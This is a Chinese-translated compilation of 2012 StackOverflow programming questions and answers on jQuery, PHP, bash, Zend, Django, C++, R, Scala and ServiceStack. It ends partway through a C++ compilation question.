# StackOverflow 问答 11782000-11782999

# jquery - 如何检查 jQuery 中的函数是否为空？

> ID：11782004
> 
> 赞同：0
> 
> 时间：2012-08-02T16:38:12.480
> 
> 标签：jquery, function

您将如何检查确实存在并已定义的函数是否为空？例如：

```
function foo(){
   // empty
}

function bar(){
   alert('something');
   // not empty
} 
```

有没有一种功能或一种简单的方法来检查这个？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:47:08.727

它不是真的很有用，通常也不是一个好主意，但你可以这样做：

```
function foo(){

}

function bar(){
   alert('something');
   // not empty
}

console.log('foo is empty :' + isEmpty(foo));
console.log('bar is empty :' + isEmpty(bar));

function isEmpty(f) {
  return typeof f === "function" && /^function [^(]*\(\)[ ]*{(.*)}$/.exec(
     f.toString().replace(/\n/g, "")
   )[1].trim() === "";
}​ 
```

[小提琴](http://jsfiddle.net/8gWn5/)

如果只是检查回调，通常的方法是检查回调是否是一个函数：

```
if (typeof callback === 'function') callback.call(); 
```

**编辑：**

也忽略评论：

```
function isEmpty(f) {
  return typeof f === "function" && /^function [^(]*\(\)[ ]*{(.*)}$/.exec(
     f.toString().replace(/\n/g, "").replace(/(\/\*[\w\'\s\r\n\*]*\*\/)|(\/\/[\w\s\']*)|(\<![\-\-\s\w\>\/]*\>)/g, '')
   )[1].trim() === "";
}​ 
```

[小提琴](http://jsfiddle.net/8gWn5/2/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:09:39.607

一个函数可以是空的，但仍然可以传递变量。这会在 adeneo 的功能中出错：

```
function bar(t) { } 
```

修改正则表达式，这是支持变量的相同函数：

```
function isEmpty(f) {
  return typeof f === "function" && /^function [^(]*\([^)]\)[ ]*{(.*)}$/.exec(
     f.toString().replace(/\n/g, "").replace(/(\/\*[\w\'\s\r\n\*]*\*\/)|(\/\/[\w\s\']*)|(\<![\-\-\s\w\>\/]*\>)/g, '')
   )[1].trim() === "";
}​ 
```

# php - 我在哪里可以找到完整的正则表达式参考？

> ID：11782006
> 
> 赞同：2
> 
> 时间：2012-08-02T16:38:22.380
> 
> 标签：php, regex

我遇到了一些我以前从未见过的正则表达式，我找不到任何关于它们做什么的信息。这是一个例子：

```
/[\p{Z}\p{Cc}\p{Cf}\p{Cs}\p{Pi}\p{Pf}]/u 
```

我正在寻找正则表达式的完整参考。

PS 我认为这个例子只提供了某些语言的单词。它适用于 PHP，但不适用于 Javascript。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T16:41:02.470

PHP PCRE（Perl 兼容正则表达式）的完整参考在[PHP 文档](http://php.net/pcre)中。

您正在查看的是[Unicode 字符属性](http://php.net/manual/en/regexp.reference.unicode.php)，也在 PHP 文档中，以及正则表达式末尾的正[则表达式修饰符](http://php.net/manual/en/reference.pcre.pattern.modifiers.php)。`u`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:10:05.300

`Mastering Regular Expression 3rd`是您的最佳选择

# bash - 如果 Bash 中不存在目录，则递归地将文件复制到多个目录中

> ID：11782016
> 
> 赞同：-1
> 
> 时间：2012-08-02T16:39:09.403
> 
> 标签：bash, directory, copy

所以我需要将文件 /home/servers/template/craftbukkit.jar 复制到 /home/servers 内的每个文件夹中，例如。/home/servers/server1、/home/servers/server2 等

但我只想在 /home/servers/whateverserveritiscurrentlyon/mods 不存在的情况下这样做。这就是我想出的，想知道它是否会起作用：

```
echo " Script to copy a file to all server directories, only if mods does not exist in that directory"

for i in /home/servers/*/; do
    if [ ! -d "$i/mods" ]; then
    cp -f /home/servers/template/craftbukkit.jar "$i"
    fi
done

echo " completed script ..." 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T16:59:26.703

看起来它应该工作。要进行非破坏性测试，请将`cp -f ...`行更改为说`echo cp -f ...`并查看输出。

它也可以稍微缩短，但不会对效率产生太大影响：

```
for i in /home/servers/*/
do
  [[ -d "${i}/mods" ]] || cp -f /home/servers/template/craftbukkit.jar "${i}/."
done 
```

# mysql - Zend 框架抱怨“已经有一个活动的事务”

> ID：11782023
> 
> 赞同：2
> 
> 时间：2012-08-02T16:39:45.410
> 
> 标签：mysql, zend-framework, transactions, zend-db

我们正在使用 zend_db_table 并且我们遇到了一些问题，因为 Zend Framework 抱怨两个事务处于活动状态：

```
[message:protected] => There is already an active transaction
[string:Exception:private] => 
[code:protected] => 0
[file:protected] => /var/www/vhosts/test.local/private/library/Zend/Db/Adapter/Pdo/Abstract.php
[line:protected] => 305
[trace:Exception:private] => Array 
```

这是控制器中的代码：

```
 public function convertAction()
{
    $this->setNoRender();

    // If the quote is a copy of a previous one, fetch all the datas
    $quoteId = Zend_Filter::filterStatic($this->getRequest()->getParam('qte_id'), 'int');
    $quoteTable = new Model_QuotesTable();
    $quoteRow = $quoteTable->findById($quoteId);
    if (count($quoteRow)) {
        $clonedId = $quoteRow->convertToJob();
        $this->flashMessageRedirect('Quotation successfully converted', '/jobs/edit/job_id/' . $clonedId);
    } else {
        $this->flashMessageRedirect('Unable to find the quote to be converted', '/quotes');
    }
} 
```

这是在扩展 zend_db_table_abstract 的 QuotesTableRow 中调用此函数：

```
 public function convertToJob()
{
    $db = $this->_getTable()->getAdapter();
    $db->beginTransaction();

    $jobsTable = new Model_JobsTable();

    try {

        /*
         * Update the status of the old row to match the $status passed into this function
         */
        $this->qte_status = "Accepted";
        $this->save();

        /*
         * Create new row with the same details as above
         */

        $newRow = $jobsTable->createRow();

        $newRow->job_title = $this->qte_title;
        $newRow->job_cus_id = $this->qte_cus_id;
        $newRow->job_enq_id = $this->qte_enq_id;
        $newRow->job_qte_id = $this->qte_id;
        $newRow->job_title = $this->qte_title;
        $newRow->job_description = $this->qte_description;
        $newRow->job_work_location_id = $this->qte_work_location_id;
        $newRow->job_work_category_id = $this->qte_work_category_id;
        $newRow->job_work_type_id = $this->qte_work_type_id;
        $newRow->job_cus_code = $this->qte_cus_code;
        $newRow->job_cus_name = $this->qte_cus_name;
        $newRow->job_wt_ref_code = $this->qte_wt_ref_code;
        $newRow->job_wt_description = $this->qte_wt_description;
        $newRow->job_wl_code = $this->qte_wl_code;
        $newRow->job_wl_description = $this->qte_wl_description;
        $newRow->job_wc_ref_code = $this->qte_wc_ref_code;
        $newRow->job_wc_description = $this->qte_wc_description;
        $newRow->job_qte_title = $this->qte_title;
        $newRow->job_datetime_created = date('Y-m-d H:i:s');

        $newRowId = $newRow->save();

        $db->commit();
        return $newRowId;
    } 
    catch (Exception $e) { 
        $db->rollback(); 

        echo('<pre>');
        print_r($e);
        echo('</pre>');
        exit();

        throw new Exception($e->getMessage());
        return false;
    }
} 
```

此外，它似乎与我们不在的模型有关，因为如果我们使用与 Model_JobsTable() 相关的 save() 函数评论该行，脚本正在运行，而当我们评论另一个保存时它返回相同的错误()。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T17:50:01.217

这个错误是从 MySQL 返回的，ZF 只是告诉你错误信息。

您是否在同一个请求中启动两个事务？这可以解释为什么您收到此错误消息，或者您可能有一个处于事务中间的中止连接并且它没有回滚或自动提交。

每个数据库连接只应启动一个事务。如果您需要两个模型在单个请求中具有活动事务，那么您需要获得 2 个单独的数据库连接。

请参阅Bill Karwin 关于这个问题的[这个（很好的）答案](https://stackoverflow.com/a/319939/892493)。

您可以运行查询`SHOW ENGINE InnoDB STATUS;`以获取活动事务的列表。如果您有一个打开的并且没有来自 PHP/ZF 的活动事务，那么请尝试关闭该事务，否则您将不得不查看您的代码并查看两个事务是如何在同一个请求中启动的。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-03T09:18:42.643

感谢您的回答，我们找到了解决方案。问题是，我们使用了这个`save()`函数两次；用更改第`save()`一个`insert()`，解决了问题：

```
public function convertToJob()
{

    $db = $this->_getTable()->getAdapter();
    $db->beginTransaction();

    $jobsTable = new Model_JobsTable();

    try {

        /*
         * Create new row with the same details as above
         */

        $data = array(
            'job_cus_id'            =>  $this->qte_cus_id,
            'job_enq_id'            =>  $this->qte_enq_id,
            'job_qte_id'            =>  $this->qte_id,
            'job_title'             =>  $this->qte_title,
            'job_description'       =>  $this->qte_description,
            'job_work_location_id'  =>  $this->qte_work_location_id,
            'job_work_category_id'  =>  $this->qte_work_category_id,
            'job_work_type_id'      =>  $this->qte_work_type_id,
            'job_cus_code'          =>  $this->qte_cus_code,
            'job_cus_name'          =>  $this->qte_cus_name,
            'job_wt_ref_code'       =>  $this->qte_wt_ref_code,
            'job_wt_description'    =>  $this->qte_wt_description,
            'job_wl_code'           =>  $this->qte_wl_code,
            'job_wl_description'    =>  $this->qte_wl_description,
            'job_wc_ref_code'       =>  $this->qte_wc_ref_code,
            'job_wc_description'    =>  $this->qte_wc_description,
            'job_qte_title'         =>  $this->qte_title,
            'job_datetime_created'  =>  date('Y-m-d H:i:s')
        );

        $newRowId = $jobsTable->insert($data);

        /*
         * Update the status of the old row to match the $status passed into this function
         */

        $this->qte_status = "Accepted";
        $this->save();

        $db->commit();

        return $newRowId;
    } 
    catch (Exception $e) {
        throw new Exception($e->getMessage());
        return false;
    }
} 
```

# django - 使用基于 Django 类的视图，如果 request.is_ajax 我如何返回不同的模板

> ID：11782025
> 
> 赞同：5
> 
> 时间：2012-08-02T16:39:51.233
> 
> 标签：django, django-forms, django-views

我发现 Django 的 request.is_ajax 是一种非常有用的方法，可以通过 JS 添加渐进式增强，并且在我的视图中仍然保持 DRY。

但是，如果 request.is_ajax，我想使用基于类的视图并使用不同的模板进行渲染。

我不清楚如何覆盖我的默认“template_name”并在基于类的视图中使模板加载有条件。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-02T17:06:26.730

覆盖[get_template_names](https://docs.djangoproject.com/en/1.9/ref/class-based-views/mixins-simple/#django.views.generic.base.TemplateResponseMixin.get_template_names)：

```
def get_template_names(self):
    if self.request.is_ajax():
        return ['ajax_template.html']
    else:
        return ['standard_template.html'] 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T17:06:42.560

执行此操作的适当方法是覆盖[`TemplateResponseMixin`](https://github.com/django/django/blob/master/django/views/generic/base.py#L105).

如果您只需要为 Ajax 请求提供不同的模板，请覆盖`get_template_names`. 如果您想完全提供不同的响应，比如说一个`application/json`响应，然后覆盖`render_to_response`以产生不同`HttpResponse`的 Ajax 请求。

# c++ - 有什么方法可以避免在 C++ 中使用非法指针？

> ID：11782027
> 
> 赞同：0
> 
> 时间：2012-08-02T16:39:55.157
> 
> 标签：c++

我有一个复杂的 A 类：

```
class A{
...
}; 
```

B 类是包含 A 的指针，并且有一个返回指针的方法。

```
class B{
A* GetA(){return pA;}
A* pA;
}; 
```

然后，当我使用 'GetA' 获取 A 的指针时，使用非法指针更容易，例如：

```
void func(A* p){
B b;
p = b.GetA();
} 
```

当我使用'func'时，我只是得到一个非法指针。上面的代码只是一个示例。而且我发现在多线程环境中很容易犯这个错误。

有什么方法可以让我确保避免这些错误吗？

非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T16:55:09.560

C++ 中没有通用的方法来保护自己免受非法指针访问，但有一些习语可以用来帮助保护自己。

保持你的类代表概念/对象，不要直接访问它们可能包含的任何指针。更喜欢例如描述性方法，或类似容器的类`begin`/`end`样式方法。

管理指针时，最好先使用标准容器，例如`vector`. 它们经过高度调整和调试，可以防止许多问题，因为它们已经拥有所有正确的构造函数、赋值、析构函数等。

如果无法使用标准容器，则更喜欢智能指针，例如`unique_ptr`, `scoped_ptr`,`shared_ptr`或`weak_ptr`取决于您的指针需要。通过使用适当的智能指针，您几乎不可能无意中犯下编码错误。

即使使用所有这些准则，您也始终可以绕过您尝试实施的任何保护。如果你发现自己使用了很多演员表，你应该退后一步重新检查你的设计。

在您的情况下，我不仅`pA`不能通过访问器访问，而且也不会将其设为原始指针。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:00:48.163

如果将构造函数中的指针初始化为 NULL：

```
class B {
    B() {
        pA = NULL;
    }
    A* GetA(){return pA;}
    A* pA;
} 
```

然后您可以在使用它之前检查指针是否为非NULL。

```
void func(A* p){
    B b;
    p = b.GetA();
    if(p != NULL) {
        //use p
    }
} 
```

此外，您传递一个指向函数的指针，然后在没有首先使用它的情况下分配给它，这似乎很奇怪。`p = b.GetA();`不会改变`func`. 也许你的意思是做这样的事情之一？

```
//Caller passes reference to their pointer, caller's pointer gets set.
void func(A *&p) {
    B b;
    p = b.GetA();
}
//Caller passes pointer to their pointer, caller's pointer gets set.
void func(A **p){
    B b;
    if(p != NULL) {
        *p = b.GetA();
    }
} 
```

# r - 按 R 中的不同列值求和

> ID：11782030
> 
> 赞同：13
> 
> 时间：2012-08-02T16:40:03.657
> 
> 标签：r, sum, unique, data.table

我在 R 中有一个非常大的数据框，并且想将其他列中每个不同值的两列相加，例如，假设我们在一天内有各种商店的交易数据框的数据，如下所示

```
shop <- data.frame('shop_id' = c(1, 1, 1, 2, 3, 3), 
  'shop_name' = c('Shop A', 'Shop A', 'Shop A', 'Shop B', 'Shop C', 'Shop C'), 
  'city' = c('London', 'London', 'London', 'Cardiff', 'Dublin', 'Dublin'), 
  'sale' = c(12, 5, 9, 15, 10, 18), 
  'profit' = c(3, 1, 3, 6, 5, 9)) 
```

这是：

```
shop_id  shop_name    city      sale profit
   1     Shop A       London    12   3
   1     Shop A       London    5    1
   1     Shop A       London    9    3
   2     Shop B       Cardiff   15   6
   3     Shop C       Dublin    10   5
   3     Shop C       Dublin    18   9 
```

我想总结每家商店的销售额和利润：

```
shop_id  shop_name    city      sale profit
   1     Shop A       London    26   7
   2     Shop B       Cardiff   15   6
   3     Shop C       Dublin    28   14 
```

我目前正在使用以下代码来执行此操作：

```
 shop_day <-ddply(shop, "shop_id", transform, sale=sum(sale), profit=sum(profit))
 shop_day <- subset(shop_day, !duplicated(shop_id)) 
```

它工作得很好，但正如我所说，我的数据框很大（140,000 行，37 列和近 100,000 个唯一行，我想求和）并且我的代码需要很长时间才能运行，然后最终说它已经耗尽内存。

有谁知道最有效的方法来做到这一点。

提前致谢！

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-02T17:13:44.787

**强制性数据表答案**

```
> library(data.table)
data.table 1.8.0  For help type: help("data.table")
> shop.dt <- data.table(shop)
> shop.dt[,list(sale=sum(sale), profit=sum(profit)), by='shop_id']
     shop_id sale profit
[1,]       1   26      7
[2,]       2   15      6
[3,]       3   28     14
> 
```

在事情变得更大之前，这听起来很好。

```
shop <- data.frame(shop_id = letters[1:10], profit=rnorm(1e7), sale=rnorm(1e7))
shop.dt <- data.table(shop)

> system.time(ddply(shop, .(shop_id), summarise, sale=sum(sale), profit=sum(profit)))
   user  system elapsed 
  4.156   1.324   5.514 
> system.time(shop.dt[,list(sale=sum(sale), profit=sum(profit)), by='shop_id'])
   user  system elapsed 
  0.728   0.108   0.840 
> 
```

如果您使用键创建 data.table，您将获得额外的速度提升：

```
shop.dt <- data.table(shop, key='shop_id')

> system.time(shop.dt[,list(sale=sum(sale), profit=sum(profit)), by='shop_id'])
   user  system elapsed 
  0.252   0.084   0.336 
> 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-12-10T17:50:56.887

我认为最简洁的方法是`dplyr`

```
library(dplyr)
shop %>% 
  group_by(shop_id, shop_name, city) %>% 
  summarise_all(sum) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-08-02T18:03:32.037

以下是如何使用基本 R 来加速这样的操作：

```
idx <- split(1:nrow(shop), shop$shop_id)
a2 <- data.frame(shop_id=sapply(idx, function(i) shop$shop_id[i[1]]),
                 sale=sapply(idx, function(i) sum(shop$sale[i])), 
                 profit=sapply(idx, function(i) sum(shop$profit[i])) ) 
```

时间减少到 0.75 秒，而我系统上的 ddply 汇总版本为 5.70 秒。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-02-07T13:37:41.537

以防万一，如果您有很长的列列表，请使用 summarise_if()

### 如果数据类型为 int，则汇总所有列

```
library(dplyr)
shop %>% 
  group_by(shop_id, shop_name, city) %>% 
  summarise_if(is.integer, sum) 
```

# jquery - 循环从控制器返回的 json 数据

> ID：11782033
> 
> 赞同：2
> 
> 时间：2012-08-02T16:40:18.733
> 
> 标签：jquery, asp.net-mvc-3, c#-4.0

我需要遍历从我的控制器返回的 json 对象。

我的控制器代码

```
 public ActionResult GetJobs()
    {
        var jobs = new JobConfig().getJobs(User.Identity.Name);

        return Json(jobs.ToList(),JsonRequestBehavior.AllowGet);

    } 
```

我的 JavaScript 代码

```
$(document).ready(function () {

    $('#search').click(function () {

        $.when(
            getUser(), //Get User Details
            getJobs()//Get Jobs
          ).then(process);

    });

});

function getUser() {

    return $.ajax({
        type: 'GET',
        url: '/ManageUsers/GetUser',
        data: { UserName: $('#txtUser').val() },
        dataType: 'json'
    });
}

function getJobs() {

      return $.ajax({
        type: 'GET',
        url: '/ManageUsers/GetJobs',
        dataType: 'json'
    });
}

function process(user,jobs) {

    //Show the user here

    if (user[0].Name != null) {

        var list = '<p> User : ' + user[0].Name + '<br/>';
        list += 'Email : ' + user[0].Email + '<br/>';
        list += 'Role : ' + user[0].Role + '<br/>';
        list += 'UserData : ' + user[0].UserData;
        list += '</p><br/>';

        alert(jobs.length);

        $('#user').empty();
        $('#user').append(list);

    }
    else {
        $('#user').empty();
        $('#user').append('User not exists');
    }
} 
```

alert(jobs.length) 表示长度为 3，因为作业对象看起来像这样

```
jobs: Array[3]
0: Array[1]
1: "success"
2: Object 
```

但我只关心 0 元素。

我认为这是使用 return $.ajax 函数时返回结果的方式。

关于从作业数组中获取第一个元素的任何想法？

问候，

萨布

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T19:59:20.437

```
var someReturnedData = [{"JobId":"ArtListLoad","JobDesc":"GOLD Article List Load","JobFilePrefix":null,"JobFileSrcDir":null,"JobFileDataDir":null,"JobFileEx‌​tension":null,"JobFileDataRange":null,"JobScript":null}] 
```

根据您的示例，给定一个从您的操作结果返回的 JSON 数据对象，您可以使用以下命令访问第一个元素：

```
someReturnedData[0] 
```

这意味着如果您想要“JobId”，您可以通过以下方式访问它：

```
someReturnedData[0].JobId 
```

编辑：

根据您的评论，您可以修改 GetJobs 函数以包含成功处理程序。执行您需要的任何处理，然后将该对象返回到您的处理函数。也许是这样的：

```
function getJobs() {

    var jobs;

    $.ajax({
        type: 'GET',
        url: '/ManageUsers/GetJobs',
        dataType: 'json',
        success: function(data) {
           jobs = data[0];
        }
    });

    return jobs;
} 
```

# scala - 在 Play 中避免 Squeryl 交易！控制器

> ID：11782036
> 
> 赞同：1
> 
> 时间：2012-08-02T16:40:35.633
> 
> 标签：scala, playframework, squeryl

我正在学习玩！我已经按照[待办事项列表教程进行操作](http://www.playframework.org/documentation/2.0.2/ScalaTodoList)。现在，我想用 Squeryl 代替 Anorm，所以我尝试翻译教程，实际上它可以工作。

尽管如此，还是有一件小事让我感到厌烦。这是我的模型的相关部分

```
def all: Iterable[Task] = from(tasks) {s => select(s)} 
```

以及控制器中相应的动作来列出所有任务

```
def tasks = Action {
    inTransaction {
        Ok(views.html.index(Task.all, taskForm))
    }
} 
```

视图包含，例如

```
<h1>@tasks.size task(s)</h1> 
```

我不喜欢的是，与更新或删除任务的方法不同，我必须在控制器操作中管理事务。

如果我转向`inTransaction`该`all`方法，我会得到一个异常，

```
[RuntimeException: No session is bound to current thread, a session must be created via Session.create and bound to the thread via 'work' or 'bindToCurrentThread' Usually this error occurs when a statement is executed outside of a transaction/inTrasaction block] 
```

因为视图试图获取 的大小`tasks`，但此时事务已经关闭。

> 有没有办法只在模型中使用 Squeryl 事务而不将这些细节暴露给控制器级别？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T18:37:53.810

好。这是因为对 Iterable 的惰性评估需要会话绑定（size() 方法）。如果您将 Iterable 转换为 List 或 Vector (IndexedSeq) 我想这可能会起作用。

```
from(tasks)(s => select(s)).toIndexedSeq //or .toList 
```

# r - 使用 (LyX + knitr + R) 关闭缓存

> ID：11782037
> 
> 赞同：0
> 
> 时间：2012-08-02T16:40:36.793
> 
> 标签：r, knitr, lyx

当我通过 knitr 向 R 提交以下类型的函数调用时，任何人都可以帮助我了解如何关闭 LyX/knitr 中的缓存：

```
\Sexpr{rnorm(1, 6, 1.1)} 
```

或一大块：

```
<<echo=FALSE, cache=FALSE>>=
rnorm(1, 6, 1.1)
@ 
```

每次我处理文档时，我都会得到与第一次完全相同的值。我知道这一定很简单，但这让我发疯了。非常感谢，-加里

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T21:52:52.383

解决了。我的 .Rprofile 中有一个 set.seed() 调用。当我删除它时，这个问题在 LyX 中消失了。它让我感到震惊，因为在 R 会话中，只有对 rnorm() 的第一次调用将由 set.seed() 确定，而不是对 rnorm() 的后续调用，而在 LyX 中，每次创建文档时都会创建一个新会话. 由于我的示例只有一次调用，因此我总是得到相同的值。谢谢大家——尤其是易慧制作针织机。

# php - PHP - 上传的文件为空

> ID：11782039
> 
> 赞同：0
> 
> 时间：2012-08-02T16:40:40.917
> 
> 标签：php, file, upload, null

当我尝试在 PHP 中上传文件时，它不会让我。在到处转储变量之后，我得到了这个：

```
Invalid file!
!
NULL
24M
32MNULL 
```

这来自于：

```
echo "Invalid file!"; //So, we screwed up...
echo "<br />" . $ext . "!<br />";
echo var_dump($_FILES['fileupl']);
echo "<br />" . ini_get('upload_max_filesize');
echo "<br />" . ini_get('post_max_size');
echo "<br />" . var_dump($_FILES['error']); 
```

我上传的任何文件都会返回。
我正在尝试上传任何文件：.zip、.jar、.png，用于一个小的 minecraft 文件共享平台。

变量：

```
$title = $_POST['title'];
    $desc = $_POST['desc'];

    $type = $_GET['type'];

    //File stuff
    $name = $_FILES['fileupl']['name'];
    $rname = $_FILES['fileupl']['tmp_name'];
    $ftype = $_FILES['fileupl']['type'];
    $size = $_FILES['fileupl']['size'];
    $ext = strrchr($rname, '.');
    $allowedExtensions = array(".zip", ".jar", ".png"); 
```

代码：

```
if (!in_array(end(explode(".",
            strtolower($name))),
            $allowedExtensions)) { 

            echo "Invalid file!"; //dafuq, how'd you screw that up man?
            echo "<br />" . $ext . "!<br />";
            echo var_dump($_FILES['fileupl']);
            echo "<br />" . ini_get('upload_max_filesize');
            echo "<br />" . ini_get('post_max_size');
            echo "<br />" . var_dump($_FILES['error']);
        }
        else
        {
            $uploaddir = './content/';

            //Begin file shizzle

            if (is_uploaded_file($_FILES['fileupl']['tmp_name'])) //Is the file uploaded?
            {
                $uploadfile = $uploaddir . basename($name);
                echo $name . " Uploaded successfully.";
                if (move_uploaded_file($rname, $uploadfile))
                {
                    echo $name . " (" . display_filesize($size) . ") Successfully uploaded!";
                    $q = mysql_query("INSERT INTO `content`(`type`, `creator`, `title`, `description`, `filename`) VALUES('" . mysql_real_escape_string($type) . "', '" . $username . "', '" . mysql_real_escape_string($title) . "', '" . mysql_real_escape_string($desc) . "', 'Anon')");
                    if (!$q)
                    {
                        echo "mySQL execution failed!";
                    }
                    else
                    {
                        echo "Uploaded to database!";
                    }
                }
                else
                {
                    echo "File could not be moved!";
                }

            }
            else
            {
                echo "File could not be uploaded!";
                echo var_dump($_FILES['fileupl']);
                echo "<br />" . ini_get('upload_max_filesize');
                echo "<br />" . ini_get('post_max_size');
            }
        } 
```

我几乎尝试了所有方法，如果有人知道发生了什么，我将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:10:54.450

将 multipart formdata 添加到标签并尝试

```
enctype="multipart/form-data" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:56:02.103

正如您在修复表单后提到的那样，您现在看到：（为清楚起见，我进行了编辑）

```
Invalid file! 
!    
array(5) { ["name"]=> string(17) "EasyMinecraft.zip" ["type"]=> string(15) "application/zip" ["tmp_name"]=> string(14) "/tmp/php87jMDe" ["error"]=> int(0) ["size"]=> int(4325565) } 
24M 
32MNULL 
Array ( [fileupl] => Array ( [name] => EasyMinecraft.zip [type] => application/zip [tmp_name] => /tmp/php87jMDe [error] => 0 [size] => 4325565 ) ) 
```

这表明 $ext 是空的。变量赋值的相关行是：

```
$rname = $_FILES['fileupl']['tmp_name'];
$ext = strrchr($rname, '.'); 
```

那么，是什么`$_FILES['fileupl']['tmp_name']`？您的输出显示它是*/tmp/php87jMDe*，当您尝试查找“。”之后的所有内容时，这显然不起作用 在里面，因为里面没有句号。您可能想要更改第一行以使用实际名称，而不是 tmp_name，例如：

```
$rname = $_FILES['fileupl']['name']; 
```

你也会有这个条件的错误：

```
if (!in_array(end(explode(".",
            strtolower($name))),
            $allowedExtensions)) { 
```

请注意，`end(explode(".", strtolower($name)))`这只会给你'zip'，而不是'.zip'。我不确定您为什么要尝试在此处修改扩展名，而不是使用`$ext`您已经创建的扩展名？我建议您在创建它时使用小写字母`$ext`，我认为您应该很好吗？

# .net - 反序列化和空引用最佳实践 - 设置为空还是忽略？

> ID：11782042
> 
> 赞同：4
> 
> 时间：2012-08-02T16:40:51.157
> 
> 标签：.net, serialization, servicestack, cloning

这是一个关于一般序列化的问题，但特别是我在我的 .NET 代码中使用了[ServiceStack 的优秀序列化程序。](http://www.servicestack.net/docs/text-serializers/json-csv-jsv-serializers)

反序列化程序是否应该在属性上设置空引用？目前似乎它忽略了空引用，只允许根据类的默认值设置这些字段。例如，此测试失败：

```
[TestMethod]
public void Deserialize_WithNullCollection_CollectionIsNull() {
    var serializer = new ServiceStack.Text.TypeSerializer<Foo>();
    Foo item = new Foo() { Strings = null };
    Foo result = serializer.DeserializeFromString(serializer.SerializeToString(item));
    Assert.IsNull(result.Strings);
}
public class Foo {
    public Foo() {
        Strings = new List<string>();
    }
    public List<string> Strings { get; set; }
} 
```

我相信这也许这个测试应该成功，但它没有——item.Foo 是一个空列表而不是一个空引用。在我看来，空引用是对象状态的一部分，就像任何实际引用一样。我是对还是错？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T18:08:21.633

这是设计使然。

默认情况下（为了节省带宽）ServiceStack 的文本序列化程序不会`null`在线发送值。如果`null`生成的 JSON 中没有，则在反序列化时不会设置该属性，这就是它采用构造函数中给出的默认值的原因。

您可以使用以下方法启用空值：

```
JsConfig.IncludeNullValues = true; 
```

这是一个静态（共享）属性，因此设置一次应该在进程中全局应用。

**使用JsonSerilaizer**时，此测试通过：

```
 [Test]
    public void Deserialize_WithNullCollection_CollectionIsNull()
    {
        JsConfig.IncludeNullValues = true;
        var item = new Foo { Strings = null };
        var json = JsonSerializer.SerializeToString(item);
        var result = JsonSerializer.DeserializeFromString<Foo>(json);
        Assert.IsNull(result.Strings);
    }

    public class Foo
    {
        public Foo()
        {
            Strings = new List<string>();
        }
        public List<string> Strings { get; set; }
    } 
```

It doesn't work in JSV-Format (i.e. **TypeSerializer**) which doesn't support `null` values, since it can't distinguish it from a `"null"` string literal. So if you want to use the JSV TypeSerializer you should assume `null` means the default property values of the type (i.e. as specified in the default constructor).

# facebook-opengraph - 开图审批时间

> ID：11782044
> 
> 赞同：-1
> 
> 时间：2012-08-02T16:40:54.280
> 
> 标签：facebook-opengraph

谁能告诉我在开放图形系统中请求批准操作所需的时间得到答复。我已经等了一个星期了。也许我的要求不符合要求，但我相信是的。我可以联系 FB 的任何人吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-03T20:00:13.953

我只花了 2 天时间，但情况有所不同。

# html - 带弹簧的 HTML5 画布

> ID：11782046
> 
> 赞同：1
> 
> 时间：2012-08-02T16:40:57.387
> 
> 标签：html, jsp, spring-mvc, canvas

我想创建一个以图形方式呈现一些数据的 Web 应用程序。HTML5 画布似乎非常适合。但我想使用 Spring MVC，从而使用 JSP。那行得通吗？可以在 JSP 页面中放置 HTML5 画布吗？有没有人有这方面的经验：有什么问题？

* * *

**编辑：** 特别是，我记得 HTML5 不是 XHTML，但[JSP 似乎需要 XHTML](https://stackoverflow.com/questions/2966399/does-using-jsp-document-jsp-in-xml-notation-imply-outputting-xhtml)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:35:04.947

您可以在 jsp 中使用 html5-canvas。只要你在jsp中包含html5语法()和canvas的用法。它会起作用的。Canvas 仅适用于这些浏览器版本。 [http://caniuse.com/canvas](http://caniuse.com/canvas) 对于不支持画布的浏览器，您可以使用 pollyfills 否则该功能将不可用。还有一点 - 只要您使用 jsp 或其他将 html 呈现给浏览器的视图，Spring MVC 或任何其他后端技术都无关紧要。谢谢

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T11:43:30.090

[正如BalusC 对另一个问题的回答](https://stackoverflow.com/a/2968641/545127)中明确指出的那样，您的 JSP 必须生成格式良好的 XML，因此您必须对没有内容的元素使用“空元素语法”。并且您应该包含 HTML5`DOCTYPE`以防止触发“[怪癖模式](https://stackoverflow.com/questions/1695787/what-is-quirks-mode)”。

# symfony - 如何在 symfony2 中使用 Monolog 包？

> ID：11782049
> 
> 赞同：2
> 
> 时间：2012-08-02T16:41:03.313
> 
> 标签：symfony, monolog

我希望能够在我的代码中将错误记录到 dev.log 或 app.log 中，但我无法看到有关如何完成它的基本示例。任何指针？我做了谷歌它。

# c++ - 使用 const int 编译时

> ID：11782050
> 
> 赞同：14
> 
> 时间：2012-08-02T16:41:14.353
> 
> 标签：c++

编译以下代码时出现以下错误：

```
3>c:\hedge\hedge\hedge\AisTarget.h(22) : error C2059: syntax error : 'constant'
3>c:\hedge\hedge\hedge\AisTarget.h(22) : error C2238: unexpected token(s) preceding ';' 
```

* * *

```
#if !defined(AisTarget_h)
#define AisTarget_h

#include "GeneralAviationItems.h"
#include <string>

